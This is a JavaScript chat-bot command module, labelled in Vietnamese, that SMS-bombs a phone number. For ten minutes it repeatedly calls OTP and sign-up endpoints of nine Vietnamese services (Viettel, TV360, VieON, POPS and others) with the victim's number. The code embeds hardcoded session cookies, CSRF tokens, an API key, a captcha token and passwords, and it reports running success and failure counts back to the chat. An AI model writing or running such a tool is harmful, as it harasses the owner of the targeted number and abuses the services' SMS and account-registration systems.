const axios = require('axios');

module.exports = {
  name: "spamsms",
  usedby: 0,
  info: "gửi thông báo đến số",
  onPrefix: false,
  cooldowns: 10,

  onLaunch: function ({ api, event }) {
    const args = event.body.trim().split(" ");
    if (args.length < 2) {
      return api.sendMessage("Vui lòng nhập số điện thoại. Ví dụ: spamsms 0123456789", event.threadID, event.messageID);
    }

    const phone = args[1];
    const spamDuration = 10 * 60 * 1000; // 10 minutes in milliseconds
    const viettelCookies = {
      'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
      '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
      'redirectLogin': 'https://viettel.vn/dang-ky',
      'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    };

    const viettelHeaders = {
      'Connection': 'keep-alive',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://viettel.vn',
      'Referer': 'https://viettel.vn/dang-ky',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
      'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
      'X-Requested-With': 'XMLHttpRequest',
      'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
      'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
    };

    const viettelData = {
      msisdn: phone,
    };

    const tv360Headers = {
      "Host": "m.tv360.vn",
      "Connection": "keep-alive",
      "Content-Length": "23",
      "Accept": "application/json, text/plain, */*",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
      "Content-Type": "application/json",
      "Origin": "http://m.tv360.vn",
      "Referer": "http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
      "Accept-Encoding": "gzip, deflate"
    };

    const tv360Data = {
      msisdn: phone
    };

    const kimungvayHeaders = {
  'Host': 'api.kimungvay.co',
  'Accept': 'application/json, text/plain, */*',
  'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Origin': 'https://h5.kimungvay.site',
  'Referer': 'https://h5.kimungvay.site/',
  'X-Requested-With': 'mark.via.gp',
  'Sec-Fetch-Site': 'cross-site',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Dest': 'empty',
  'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
};

    const kimungvayData = `phone=${phone}&type=2&ctype=1&chntoken=e51d233aa164cb9ec126578fc2d553f6`;

        const vivohanCookies = {
      'JSESSIONID': 'D15C9181DF236AE13B2AD4DFC7F826EB',
    };

    const vivohanHeaders = {
      'Host': 'h5.vivohan.com',
      'Connection': 'keep-alive',
      'system': 'android',
      'appcodename': 'Mozilla',
      'deviceType': 'h5',
      'screenresolution': '1080,1920',
      'appname': 'Netscape',
      'channel': 'e242',
      'w': '1080',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
      'Content-Language': 'vn',
      'Accept': 'application/json, text/plain, */*',
      'platform': 'Linux i686',
      'vendor': 'Google Inc.',
      'Content-Type': 'application/json;charset=UTF-8',
      'h': '1920',
      'appversion': '5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
      'Origin': 'https://h5.vivohan.com',
      'X-Requested-With': 'mark.via.gp',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': 'https://h5.vivohan.com/login',
      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    };

    const vivohanData = {
      phone: phone,
      type: 2,
      timestamp: 1703951639000,
      referrer: 'utm_source=e242',
      af_prt: 'e242',
      sign: '0f656af82eb1da33221a06d1171db265',
      appversion: '1.0.0',
      channel: 1,
      app_version: '1.0.0',
      version: '1.0.0',
      imei: 'f30c673736f5301bd94aaaad5b543d90',
      uuid: 'f30c673736f5301bd94aaaad5b543d90',
      pkg_name: 'com.qcvivo.vivohanh5',
    };

        const itaphoaHeaders = {
      'authority': 'api.itaphoa.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
      'dnt': '1',
      'origin': 'https://shop.mioapp.vn',
      'referer': 'https://shop.mioapp.vn/',
      'region-code': 'HCM',
      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    };

    const itaphoaParams = {
      phone: phone,
      type: 'call',
    };

        const kavayCookies = {
      'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7',
      'tel': phone,
    };

    const kavayHeaders = {
      'Host': 'kavaycash.com',
      'Connection': 'keep-alive',
      'Cache-Control': 'max-age=0',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'X-Requested-With': 'mark.via.gp',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-User': '?1',
      'Sec-Fetch-Dest': 'document',
      'Referer': 'https://kavaycash.com/',
      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    };

const kingMeHeaders = {
  'authority': 'kingme.pro',
  'accept': '*/*',
  'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
  'cookie': '__RequestVerificationToken=wLji7PALv76EqA41fCZ0iRJju9NJHvzMkr3ra5BSMXafv_gjLvq4xx7SRagVJ3uL9O0ZDtZld1TsmYKGYU3XUkuVjfI1; ASP.NET_SessionId=yo3axja3srqd4qapzd0bfkrg; UrlRefer=2gg061902; _gid=GA1.2.527718006.1699094428; _gat_gtag_UA_138230112_4=1; comm100_guid2_100014013=yCSs5Di-nEeZ0KXurvHXZA; _ga=GA1.2.1588581150.1699094427; .AspNet.ApplicationCookie=4Psabhtu-g997cCpn-0tWsIZTCshDocNG7Bw5ejOT1znQxXfomOuVMydDGFhS27fjtWzETZADUFBpFYih_CpbHw7W3gLbYXoRv0EMonPpWwiI3utDh1EAPO5tYUlsy0KB9tPwd9RlV-gv08OMEWHOKsEdsjlRGkR5I8qZVc6uAS4LCx9O48tGFpP1JRm1M1AW6c5M6xKpDJTeP_QYTA0d2M_M0ViJ3-KkDB3lbF-6r9M5oNhRAva8wVFOprOr1i0NK1_78SZrF0d11EymXKZs7vtXeS0_1lcNyPoRU8sYj9glOI5YjGdLE0iPMd7MLiNUZlXl-H0nedMZ8LF4829V-WaA9gRMiF4PJnQTJlsI1ItqlrepQ1zuv-p1IYjmag0C34Sx_67Y_csQ_n-u0FzE39dr44JKNv-LXRjtx9VpthaWSyDjHSynKWSeqKhp8Z-pUiEbj5d7QtKDIzg9x57-ukz7JKnePDefvWNP2MYVSK7ih_EMKm-z9oKcnbMnsOMS2rM0jA3Xjw9XwNm6QrgCchx5sid6RNURUPm3vmC3meqZ96M5sKKqGQoHPRdub235PH-LOnO5gtg1ZVPhjF9Ym6fH2bOsIUVsUKf9MyOIUBvOxND; _ga_PLRPEKN946=GS1.1.1699094427.1.1.1699094474.0.0.0',
  'dnt': '1',
  'origin': 'https://kingme.pro',
  'referer': 'https://kingme.pro/',
  'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'empty',
  'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'same-origin',
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'x-requested-with': 'XMLHttpRequest',
};

const kingMeData = {
  msisdn: phone,
};

    const vieonHeaders = {
  'Host': 'api.vieon.vn',
  'content-length': '201',
  'accept': 'application/json, text/plain, */*',
  'content-type': 'application/x-www-form-urlencoded',
  'sec-ch-ua-mobile': '?1',
  'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
  'user-agent': 'Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30...',
  'sec-ch-ua-platform': '"Android"',
  'origin': 'https://vieon.vn',
  'sec-fetch-site': 'same-site',
  'sec-fetch-mode': 'cors',
  'sec-fetch-dest': 'empty',
  'referer': 'https://vieon.vn/?utm_source=google&utm_medium=cpc...',
  'accept-encoding': 'gzip, deflate, br',
  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4'
};

// Request parameters and payload
const params = {
  platform: 'mobile_web',
  ui: '012021'
};

const payload = {
  phone_number: phone,
  password: 'Vexx007',
  given_name: '',
  device_id: '7c775cd1cd49a31c3893ca1e09abbde3',
  platform: 'mobile_web',
  model: 'Android 10',
  push_token: '',
  device_name: 'Chrome/110',
  device_type: 'desktop',
  ui: '012021'
};

    const popsHeaders = {
      'authority': 'products.popsww.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
      'api-key': '5d2300c2c69d24a09cf5b09b',
      'content-type': 'application/json',
      'dnt': '1',
      'lang': 'vi',
      'origin': 'https://pops.vn',
      'platform': 'web',
      'profileid': '657ca7582a4ac90054bcc10a',
      'referer': 'https://pops.vn/auth/signin-signup/signup',
      'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'sub-api-version': '1.1',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'x-env': 'production',
    };

    const popsData = {
      fullName: '',
      account: phone,
      password: 'xX.j2!h5gAv',
      confirmPassword: 'xX.j2!h5gAv',
      recaptcha: '03AFcWeA7k7xTO-mWbrjVz2PZ9x-n9aq6g1xwVO4rLyuQdURsV9tGIC8J3GO2KbrsA0-Sm9xcvRH5VmR75FY-2FDO2GV3Iy_ZIIH8F-8RdvFMl2Um9qdr9Zsyrf7zDrw6QCA7yDSo0lHfSO_Ja1hcoHodAjUIIXI52Gqfr9nJGotdUiNuobzxW1ADC4_1y9zRUdCNZVobRZfR_eE-ZA2r_PbXoWLhp5KzeLWWXIT6Al15ZdSeC5AfGzs1pVYO9a2ZuW3x4vFYU_Z7Jfl784gjS8EMAQpCZSHcxx9c6dvTZNRliFjymEWyD6ps09g9wFg1SoYjRrSjqMOlZijxS04RQ5UalO4DW1JVF4jYq5OMX0GXD-R6-S1_M9KBTN46B4HYnww_PPv5cauuWtBNwoWik8IInjUr_TdqIH2h__vXukXMt-fs7LJll_rHKQVtjJT3IQBWHbPOTSfAk7ehHFg5Zi7TgHaJsrdjej4T8fN53cqXV9Mu9utFNpOK7Fdrk9_iaUWPewcZ3QukyzVRCD--v5rnw58hM493AamrQsYbqrcOL6fOK-8nO6Ps2M7k-nfLOdN9vYyYpl4w1xvQfjw3oJ2UUwy4ANKHPTM2_B4FyVru8fhyGdwM367t2E3mliLsz2A0HzKzGBk3A51f8KY_c0CDjMbRitcMFHsdQkjuRgGi69tfQ_nPaWAU5ox7nvjeDzBBW6ojQMz2iHciPtsKISt5_pkDJ5BW9W38GqAvUqz48JQPuXa6LQwfaFWvfN5nCTu4ru4mLyjqR_th7DS2A3USqmIMAbMDtXL2oyCMk_OBmQoQv9T2_cqBWCemjTmKOCdAeBK18MNW2ugpnIN0lDUtxqFUVRYKRWiQIv75QQXoe8xO4uXxBb8Ee95pCQIeaRWL2G5lvj5z1P4jiKUJ_8EK5yFYp1y_utA8NIJ6sZNyxA8BW2X1NcqJM4NaDDhDP4MaAHFqNbmlX7rQvJjLJd_PviL855FMVuF6lFGAY2l3p8SLrGYnqH4RWg1bMU_Hu1cLdmLSD6eA4BsrkIXpTyXGQLL97GBoYgARVdvgofYSz7pVwicRPUXfkMzLo4TF-HFsAcI91-RFB3ZTKXJUsKEbmIA_BRBY4oWAYCsnFVW_cTGCaaRpECLOF06bAjjoDokEizIEXKO1rDgbl-30kjfM29Yp9QY8FC_NaUEcRQvGF4JB6bAhEU3mL3lvu1Y5AcvtCJyKHcf5due0hnZun1vAaHoY5OscicczZIRl2ldGrwpy1PmlEbkQuU9aAYwebMF9X6vaVPZmf8qYRB467_r31Y4maNgVET7I520vabSTd0S3BQ5cAiB4JhMoKUO5Ky_OtVlHezMdx20CVXxtDXFf4gHpQYRkOCwxcNvvZQZrtcI52wDXCc_oK3ze9zVCrD0249gMiy9YapELDGBSQ6IEd42WJdZWON1kDK5Gj9FM0RVkhnwovPHUUo3iwBzZMfAYivDvnkIA9dKyR8fJ55tWcUmL5INvpAxu2WQE5DIIYDwVa2UTd4k1XI-vgiV_zSsY7hMcCPhHDsyDGyz2avKG5QhFgzxp8Womf715LS8ZopD4M0GNnUptiRxKb3VQt1wkhfGtCjXYolZX8YJ12X4y3abYOf65A4w',
    };



    // Initial message to be edited later
    let messageID = null;
    let successCount = 0;
    let failureCount = 0;

    // Send initial message showing spam details
    const initialMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
    api.sendMessage(initialMessage, event.threadID, (error, messageInfo) => {
      if (!error) {
        messageID = messageInfo.messageID;
      }
    });

    // Function to send spam requests
    const sendSpamRequests = () => {
      // Send both requests in parallel
      Promise.all([
        axios.post('https://viettel.vn/api/get-otp', viettelData, {
          headers: viettelHeaders,
          withCredentials: true,
          cookies: viettelCookies,
        }),
        axios.post("http://m.tv360.vn/public/v1/auth/get-otp-login", tv360Data, {
          headers: tv360Headers
        }), 
        axios.post("https://api.kimungvay.co/h5/LoginMessage_ultimate", kimungvayData, {
          headers: kimungvayHeaders
        }), 
        axios.post("https://h5.vivohan.com/api/register/app/sendSms", vivohanData, {
          headers: vivohanHeaders,
          withCredentials: true,
          cookies: vivohanCookies,
        }), 
        axios.get('https://api.itaphoa.com/customer/send-gen-otp', {
          params: itaphoaParams,
          headers: itaphoaHeaders
        }), 
        axios.get('https://kavaycash.com/verification/', {
          headers: kavayHeaders,
          cookies: kavayCookies
        }), 
        axios.post('https://kingme.pro/vi/Otp/SendOtpVerifyPhoneNumber', kingMeData, { headers: kingMeHeaders }), 
        axios.post('https://api.vieon.vn/backend/user/register/mobile', payload, {
  headers: vieonHeaders,
  params: params
}), 
        axios.post('https://products.popsww.com/api/v5/auths/register', popsData, { headers: popsHeaders })
      ])
      .then(() => {
        successCount += 8;
        updateMessage();
      })
      .catch(() => {
        failureCount += 8;
        updateMessage();
      });
    };

    // Function to update the message with success and failure count
    const updateMessage = () => {
      const updatedMessage = `SPAM SMS\nSố: ${phone}\nThời gian spam: 10 phút\nSố lần gửi thành công: ${successCount}\nSố lần gửi thất bại: ${failureCount}`;
      if (messageID) {
        api.editMessage(updatedMessage, event.threadID, messageID);
      }
    };

    // Send the spam requests every 120 seconds (120000 milliseconds)
    const interval = setInterval(sendSpamRequests, 120000);

    // Send the first spam request immediately
    sendSpamRequests();

    // Stop spamming after the specified duration
    setTimeout(() => {
      clearInterval(interval);
      api.sendMessage(`Đã dừng spam SMS cho số ${phone}. Số lần gửi thành công: ${successCount}, thất bại: ${failureCount}`, event.threadID, event.messageID);
    }, spamDuration);
  }
};
